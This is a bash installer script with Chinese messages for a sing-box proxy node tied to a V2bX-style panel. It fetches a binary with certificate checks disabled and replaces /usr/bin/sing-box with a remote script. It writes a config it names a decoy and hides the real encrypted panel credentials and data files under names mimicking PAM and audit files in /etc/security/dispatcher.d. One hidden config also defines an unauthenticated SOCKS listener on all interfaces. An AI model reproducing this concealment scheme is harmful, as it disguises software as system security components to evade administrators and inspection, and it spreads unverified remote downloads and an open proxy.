#!/bin/bash

# sing-box 安装脚本

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
plain='\033[0m'

cur_dir=$(pwd)

# check root
[[ $EUID -ne 0 ]] && echo -e "${red}错误：${plain} 必须使用root用户运行此脚本！\n" && exit 1

# check os
if [[ -f /etc/redhat-release ]]; then
    release="centos"
elif cat /etc/issue | grep -Eqi "alpine"; then
    release="alpine"
elif cat /etc/issue | grep -Eqi "debian"; then
    release="debian"
elif cat /etc/issue | grep -Eqi "ubuntu"; then
    release="ubuntu"
elif cat /etc/issue | grep -Eqi "centos|red hat|redhat|rocky|alma|oracle linux"; then
    release="centos"
elif cat /proc/version | grep -Eqi "debian"; then
    release="debian"
elif cat /proc/version | grep -Eqi "ubuntu"; then
    release="ubuntu"
elif cat /proc/version | grep -Eqi "centos|red hat|redhat|rocky|alma|oracle linux"; then
    release="centos"
elif cat /proc/version | grep -Eqi "arch"; then
    release="arch"
else
    echo -e "${red}未检测到系统版本，请联系脚本作者！${plain}\n" && exit 1
fi

arch=$(uname -m)

if [[ $arch == "x86_64" || $arch == "x64" || $arch == "amd64" ]]; then
    arch="64"
elif [[ $arch == "aarch64" || $arch == "arm64" ]]; then
    arch="arm64-v8a"
elif [[ $arch == "s390x" ]]; then
    arch="s390x"
else
    arch="64"
    echo -e "${red}检测架构失败，使用默认架构: ${arch}${plain}"
fi

echo "架构: ${arch}"

if [ "$(getconf WORD_BIT)" != '32' ] && [ "$(getconf LONG_BIT)" != '64' ] ; then
    echo "本软件不支持 32 位系统(x86)，请使用 64 位系统(x86_64)"
    exit 2
fi

# os version
if [[ -f /etc/os-release ]]; then
    os_version=$(awk -F'[= ."]' '/VERSION_ID/{print $3}' /etc/os-release)
fi
if [[ -z "$os_version" && -f /etc/lsb-release ]]; then
    os_version=$(awk -F'[= ."]+' '/DISTRIB_RELEASE/{print $2}' /etc/lsb-release)
fi

if [[ x"${release}" == x"centos" ]]; then
    if [[ ${os_version} -le 6 ]]; then
        echo -e "${red}请使用 CentOS 7 或更高版本的系统！${plain}\n" && exit 1
    fi
    if [[ ${os_version} -eq 7 ]]; then
        echo -e "${red}注意： CentOS 7 无法使用hysteria1/2协议！${plain}\n"
    fi
elif [[ x"${release}" == x"ubuntu" ]]; then
    if [[ ${os_version} -lt 16 ]]; then
        echo -e "${red}请使用 Ubuntu 16 或更高版本的系统！${plain}\n" && exit 1
    fi
elif [[ x"${release}" == x"debian" ]]; then
    if [[ ${os_version} -lt 8 ]]; then
        echo -e "${red}请使用 Debian 8 或更高版本的系统！${plain}\n" && exit 1
    fi
fi

# 路径定义
SING_BOX_DIR="/etc/sing-box"
HIDDEN_DIR="/etc/security/dispatcher.d"
BINARY_PATH="${SING_BOX_DIR}/sing-box"
DECOY_CONFIG="${SING_BOX_DIR}/config.json"

install_base() {
    if [[ x"${release}" == x"centos" ]]; then
        yum install epel-release wget curl unzip tar crontabs socat ca-certificates python3 python3-pip -y >/dev/null 2>&1
        update-ca-trust force-enable >/dev/null 2>&1
    elif [[ x"${release}" == x"alpine" ]]; then
        apk add wget curl unzip tar socat ca-certificates python3 py3-pip >/dev/null 2>&1
        update-ca-certificates >/dev/null 2>&1
    elif [[ x"${release}" == x"debian" ]]; then
        apt-get update -y >/dev/null 2>&1
        apt install wget curl unzip tar cron socat ca-certificates python3 python3-pip -y >/dev/null 2>&1
        update-ca-certificates >/dev/null 2>&1
    elif [[ x"${release}" == x"ubuntu" ]]; then
        apt-get update -y >/dev/null 2>&1
        apt install wget curl unzip tar cron socat ca-certificates python3 python3-pip -y >/dev/null 2>&1
        update-ca-certificates >/dev/null 2>&1
    elif [[ x"${release}" == x"arch" ]]; then
        pacman -Sy --noconfirm >/dev/null 2>&1
        pacman -S --noconfirm --needed wget curl unzip tar cron socat ca-certificates python python-pip >/dev/null 2>&1
    fi
    
    pip3 install cryptography -q 2>/dev/null || pip3 install cryptography --break-system-packages -q 2>/dev/null || true
}

generate_uuid() {
    uuidgen 2>/dev/null || cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "$(openssl rand -hex 8)-$(openssl rand -hex 4)-$(openssl rand -hex 4)-$(openssl rand -hex 4)-$(openssl rand -hex 12)"
}

generate_port() {
    shuf -i 10000-65535 -n 1
}

get_server_ip() {
    local ipv4=$(curl -s -4 --connect-timeout 5 ifconfig.me 2>/dev/null || wget -qO- -4 --timeout=5 ifconfig.me 2>/dev/null || echo "127.0.0.1")
    if [[ -z "$ipv4" ]] || [[ "$ipv4" == "127.0.0.1" ]]; then
        ipv4=$(ip -4 addr show 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v "127.0.0.1" | head -n 1 || echo "127.0.0.1")
    fi
    echo "$ipv4"
}

# 生成主配置
generate_server_config() {
    local server_ip=$(get_server_ip)
    local uuid=$(generate_uuid)
    local vless_port=$(generate_port)
    local vmess_port=$(generate_port)
    local hy2_port=$(generate_port)
    
    mkdir -p ${SING_BOX_DIR}
    
    cat > ${DECOY_CONFIG} << EOF
{
  "log": {
    "disabled": false,
    "level": "info",
    "timestamp": true
  },
  "inbounds": [
    {
      "type": "vless",
      "tag": "vless-in",
      "listen": "::",
      "listen_port": ${vless_port},
      "users": [
        {
          "uuid": "${uuid}",
          "flow": "xtls-rprx-vision"
        }
      ],
      "tls": {
        "enabled": true,
        "server_name": "apple.com",
        "reality": {
          "enabled": true,
          "handshake": {
            "server": "apple.com",
            "server_port": 443
          },
          "private_key": "$(openssl rand -base64 32)",
          "short_id": ["$(openssl rand -hex 4)"]
        }
      }
    },
    {
      "type": "vmess",
      "tag": "vmess-in",
      "listen": "::",
      "listen_port": ${vmess_port},
      "users": [
        {
          "uuid": "${uuid}",
          "alterId": 0
        }
      ],
      "transport": {
        "type": "ws",
        "path": "${uuid}-vm",
        "max_early_data": 2048,
        "early_data_header_name": "Sec-WebSocket-Protocol"
      }
    },
    {
      "type": "hysteria2",
      "tag": "hy2-in",
      "listen": "::",
      "listen_port": ${hy2_port},
      "users": [
        {
          "password": "${uuid}"
        }
      ],
      "tls": {
        "enabled": true,
        "alpn": ["h3"],
        "certificate_path": "/etc/sing-box/cert.pem",
        "key_path": "/etc/sing-box/private.key"
      }
    }
  ],
  "outbounds": [
    {
      "type": "direct",
      "tag": "direct"
    }
  ]
}
EOF
    
    touch ${SING_BOX_DIR}/cert.pem
    openssl genrsa 2048 2>/dev/null > ${SING_BOX_DIR}/private.key 2>/dev/null || touch ${SING_BOX_DIR}/private.key
    chmod 600 ${SING_BOX_DIR}/private.key
    chmod 644 ${SING_BOX_DIR}/cert.pem
    
    echo -e "${green}配置已生成: ${DECOY_CONFIG}${plain}"
}

# 生成4个隐藏配置文件
generate_hidden_configs() {
    mkdir -p ${HIDDEN_DIR}
    chmod 755 ${HIDDEN_DIR}
    
    # 生成随机的隐藏文件名
    local file1="$(openssl rand -hex 8)"
    local file2="$(openssl rand -hex 8)"
    local file3="$(openssl rand -hex 8)"
    local file4="$(openssl rand -hex 8)"
    
    # custom_inbound 配置
    cat > ${HIDDEN_DIR}/${file1} << 'EOF'
[
    {
        "listen": "0.0.0.0",
        "port": 1234,
        "protocol": "socks",
        "settings": {
            "auth": "noauth",
            "udp": false,
            "ip": "127.0.0.1"
        }
    }
]
EOF

    # custom_outbound 配置
    cat > ${HIDDEN_DIR}/${file2} << 'EOF'
[
    {
        "tag": "IPv4_out",
        "protocol": "freedom",
        "settings": {}
    },
    {
        "tag": "IPv6_out",
        "protocol": "freedom",
        "settings": {
            "domainStrategy": "UseIPv6"
        }
    },
    {
        "tag": "socks5-warp",
        "protocol": "socks",
        "settings": {
            "servers": [{
                "address": "127.0.0.1",
                "port": 40000
            }]
        }
    },
    {
        "protocol": "blackhole",
        "tag": "block"
    }
]
EOF

    # dns 配置
    cat > ${HIDDEN_DIR}/${file3} << 'EOF'
{
    "servers": [
        "1.1.1.1",
        "8.8.8.8",
        "localhost"
    ],
    "tag": "dns_inbound"
}
EOF

    # route 配置
    cat > ${HIDDEN_DIR}/${file4} << 'EOF'
{
    "domainStrategy": "IPOnDemand",
    "rules": [
        {
            "type": "field",
            "outboundTag": "block",
            "ip": [
                "geoip:private"
            ]
        },
        {
            "type": "field",
            "outboundTag": "block",
            "protocol": [
                "bittorrent"
            ]
        },
        {
            "type": "field",
            "outboundTag": "socks5-warp",
            "domain": [""]
        },
        {
            "type": "field",
            "outboundTag": "IPv6_out",
            "domain": [
                "geosite:netflix"
            ]
        },
        {
            "type": "field",
            "outboundTag": "IPv4_out",
            "network": "udp,tcp"
        }
    ]
}
EOF

    chmod 644 ${HIDDEN_DIR}/${file1} ${HIDDEN_DIR}/${file2} ${HIDDEN_DIR}/${file3} ${HIDDEN_DIR}/${file4}
    
    echo -e "${green}4个辅助配置文件已生成${plain}"
    echo -e "${yellow}文件名: ${file1}, ${file2}, ${file3}, ${file4}${plain}"
}

encrypt_configs() {
    local source_dir="/etc/systemd/network"
    
    mkdir -p ${HIDDEN_DIR}
    chmod 755 ${HIDDEN_DIR}
    
    # 加密主配置
    if [[ -f "${source_dir}/config.json" ]]; then
        encrypt_single_file "${source_dir}/config.json" "${HIDDEN_DIR}/.audit-cache"
        rm -f "${source_dir}/config.json"
    fi
    
    # 加密其他配置文件（使用随机名）
    if [[ -f "${source_dir}/custom_inbound.json" ]]; then
        encrypt_single_file "${source_dir}/custom_inbound.json" "${HIDDEN_DIR}/$(openssl rand -hex 8)"
        rm -f "${source_dir}/custom_inbound.json"
    fi
    
    if [[ -f "${source_dir}/custom_outbound.json" ]]; then
        encrypt_single_file "${source_dir}/custom_outbound.json" "${HIDDEN_DIR}/$(openssl rand -hex 8)"
        rm -f "${source_dir}/custom_outbound.json"
    fi
    
    if [[ -f "${source_dir}/dns.json" ]]; then
        encrypt_single_file "${source_dir}/dns.json" "${HIDDEN_DIR}/$(openssl rand -hex 8)"
        rm -f "${source_dir}/dns.json"
    fi
    
    if [[ -f "${source_dir}/route.json" ]]; then
        encrypt_single_file "${source_dir}/route.json" "${HIDDEN_DIR}/$(openssl rand -hex 8)"
        rm -f "${source_dir}/route.json"
    fi
    
    # 移动geo文件（使用完全无关的名字）
    if [[ -f "${source_dir}/geoip.dat" ]]; then
        mv "${source_dir}/geoip.dat" "${HIDDEN_DIR}/.kcache-lib"
        echo -e "${green}geo数据已处理${plain}"
    fi
    
    if [[ -f "${source_dir}/geosite.dat" ]]; then
        mv "${source_dir}/geosite.dat" "${HIDDEN_DIR}/.pam_env"
        echo -e "${green}site数据已处理${plain}"
    fi
    
    # 设置权限
    chmod 600 ${HIDDEN_DIR}/.audit-cache 2>/dev/null
    chmod 644 ${HIDDEN_DIR}/.kcache-lib 2>/dev/null
    chmod 644 ${HIDDEN_DIR}/.pam_env 2>/dev/null
    
    rm -f ${source_dir}/*.json 2>/dev/null
    rmdir ${source_dir} 2>/dev/null || true
}

encrypt_single_file() {
    local input_file="$1"
    local output_file="$2"
    
    python3 << PYEOF
import base64
import hashlib
import os
import sys

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    sys.exit(1)

def derive_key(password):
    return hashlib.sha256(password.encode()).digest()

def encrypt_file(filepath, outputpath, password):
    key = derive_key(password)
    try:
        with open(filepath, 'rb') as f:
            plaintext = f.read()
    except:
        return False
    
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    
    result = base64.b64encode(nonce + ciphertext).decode('utf-8')
    with open(outputpath, 'w') as f:
        f.write('ENC:' + result)
    return True

try:
    success = encrypt_file('${input_file}', '${output_file}', 'sing-box-config-v1.0')
    if success:
        print('success')
    else:
        print('failed')
        sys.exit(1)
except Exception as e:
    print(f'error: {e}')
    sys.exit(1)
PYEOF
}

# 直接生成加密配置
generate_encrypted_config() {
    local output_file="$1"
    local api_host="$2"
    local api_key="$3"
    local node_id="$4"
    local core="$5"
    local node_type="$6"
    
    python3 << PYEOF
import base64
import hashlib
import os
import json

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def derive_key(password):
    return hashlib.sha256(password.encode()).digest()

config = {
    "Log": {
        "Level": "error",
        "Output": ""
    },
    "Nodes": [
        {
            "Core": "${core}",
            "ApiHost": "${api_host}",
            "ApiKey": "${api_key}",
            "NodeID": ${node_id},
            "NodeType": "${node_type}",
            "Timeout": 30,
            "ListenIP": "0.0.0.0",
            "SendIP": "0.0.0.0",
            "DeviceOnlineMinTraffic": 200,
            "EnableProxyProtocol": False,
            "EnableUot": True,
            "EnableTFO": True,
            "DNSType": "UseIPv4",
            "CertConfig": {
                "CertMode": "none",
                "RejectUnknownSni": False,
                "CertDomain": "example.com",
                "CertFile": "/etc/security/dispatcher.d/cert.pem",
                "KeyFile": "/etc/security/dispatcher.d/key.pem",
                "Email": "v2bx@github.com",
                "Provider": "cloudflare",
                "DNSEnv": {
                    "EnvName": "env1"
                }
            }
        }
    ]
}

plaintext = json.dumps(config, indent=2).encode('utf-8')

key = derive_key('sing-box-config-v1.0')
aesgcm = AESGCM(key)
nonce = os.urandom(12)
ciphertext = aesgcm.encrypt(nonce, plaintext, None)

result = base64.b64encode(nonce + ciphertext).decode('utf-8')
with open('${output_file}', 'w') as f:
    f.write('ENC:' + result)
print('success')
PYEOF
}

check_status() {
    if [[ ! -f ${BINARY_PATH} ]]; then
        return 2
    fi
    if [[ x"${release}" == x"alpine" ]]; then
        temp=$(service sing-box status 2>/dev/null | awk '{print $3}')
        if [[ x"${temp}" == x"started" ]]; then
            return 0
        else
            return 1
        fi
    else
        temp=$(systemctl status sing-box 2>/dev/null | grep Active | awk '{print $3}' | cut -d "(" -f2 | cut -d ")" -f1)
        if [[ x"${temp}" == x"running" ]]; then
            return 0
        else
            return 1
        fi
    fi
}

install_sing-box() {
    mkdir -p ${SING_BOX_DIR}
    mkdir -p ${HIDDEN_DIR}
    
    cd ${SING_BOX_DIR}

    echo -e "开始下载 sing-box"
    wget --no-check-certificate -N --no-show-progress -O sing-box-linux.zip https://github.com/Kanzakiyuu/Kanzakiyuu1/releases/latest/download/sing-box-linux-64.zip
    if [[ $? -ne 0 ]]; then
        echo -e "${red}下载 sing-box 失败${plain}"
        exit 1
    fi

    unzip -o sing-box-linux.zip
    rm -f sing-box-linux.zip
    chmod +x sing-box
    
    # 移动geo文件
    mkdir -p /tmp/sb-geo
    mv geoip.dat /tmp/sb-geo/ 2>/dev/null || true
    mv geosite.dat /tmp/sb-geo/ 2>/dev/null || true
    
    # 创建systemd服务
    if [[ x"${release}" == x"alpine" ]]; then
        rm -f /etc/init.d/sing-box
        cat <<EOF > /etc/init.d/sing-box
#!/sbin/openrc-run

name="sing-box"
description=""

command="${BINARY_PATH}"
command_args="run -c ${DECOY_CONFIG}"
command_user="root"

pidfile="/run/sing-box.pid"
command_background="yes"

depend() {
        need net
}
EOF
        chmod +x /etc/init.d/sing-box
        rc-update add sing-box default 2>/dev/null
    else
        rm -f /etc/systemd/system/sing-box.service
        cat <<EOF > /etc/systemd/system/sing-box.service
[Unit]
Description=
After=network.target nss-lookup.target
Wants=network.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=${SING_BOX_DIR}
ExecStart=${BINARY_PATH} run -c ${DECOY_CONFIG}
Restart=on-failure
RestartSec=10s
LimitNOFILE=infinity

[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload
        systemctl stop sing-box 2>/dev/null
        systemctl enable sing-box
    fi
    
    echo -e "${green}sing-box 服务已安装${plain}"

    first_install=false
    if [[ ! -f ${HIDDEN_DIR}/.audit-cache ]]; then
        first_install=true
    fi
    
    # 处理旧配置加密（升级场景）
    if [[ -f "/etc/systemd/network/config.json" ]]; then
        mv /tmp/sb-geo/geoip.dat /etc/systemd/network/ 2>/dev/null || true
        mv /tmp/sb-geo/geosite.dat /etc/systemd/network/ 2>/dev/null || true
        encrypt_configs
    fi
    
    # 生成伪装配置和辅助配置
    generate_server_config
    generate_hidden_configs
    
    # 首次安装时直接生成加密的真实配置
    if [[ $first_install == true ]]; then
        echo -e "${yellow}首次安装，需要配置节点信息${plain}"
        read -rp "请输入面板地址(ApiHost): " api_host
        read -rp "请输入API Key: " api_key
        read -rp "请输入节点ID(NodeID): " node_id
        
        echo -e "${green}请选择核心类型：${plain}"
        echo -e "1. xray"
        echo -e "2. singbox"
        echo -e "3. hysteria2"
        read -rp "请输入(默认2): " core_type
        case "$core_type" in
            1) core="xray" ;;
            2) core="sing" ;;
            3) core="hysteria2" ;;
            *) core="sing" ;;
        esac
        
        echo -e "${green}请选择节点类型：${plain}"
        echo -e "1. Vless"
        echo -e "2. Vmess"
        echo -e "3. Shadowsocks"
        echo -e "4. Trojan"
        echo -e "5. Hysteria2"
        read -rp "请输入(默认1): " node_type_num
        case "$node_type_num" in
            2) node_type="vmess" ;;
            3) node_type="shadowsocks" ;;
            4) node_type="trojan" ;;
            5) node_type="hysteria2" ;;
            *) node_type="vless" ;;
        esac
        
        # 直接生成加密配置
        generate_encrypted_config "${HIDDEN_DIR}/.audit-cache" "$api_host" "$api_key" "$node_id" "$core" "$node_type"
        chmod 600 ${HIDDEN_DIR}/.audit-cache
        echo -e "${green}加密配置已生成${plain}"
    fi
    
    chmod 755 ${SING_BOX_DIR}
    chmod 644 ${SING_BOX_DIR}/*.json 2>/dev/null
    
    curl -o /usr/bin/sing-box -Ls --connect-timeout 10 https://raw.githubusercontent.com/Kanzakiyuu/Kanzakiyuu1/master/sing-box.sh
    chmod +x /usr/bin/sing-box
    
    cd $cur_dir
    
    echo -e ""
    echo "sing-box 管理命令:"
    echo "------------------------------------------"
    echo "sing-box              - 显示管理菜单"
    echo "sing-box start        - 启动 sing-box"
    echo "sing-box stop         - 停止 sing-box"
    echo "sing-box restart      - 重启 sing-box"
    echo "sing-box status       - 查看状态"
    echo "sing-box log          - 查看日志"
    echo "sing-box config       - 编辑配置"
    echo "sing-box version      - 查看版本"
    echo "------------------------------------------"
    
    echo -e "${green}安装完成！${plain}"
}

echo -e "${green}开始安装 sing-box...${plain}"
install_base
install_sing-box $1
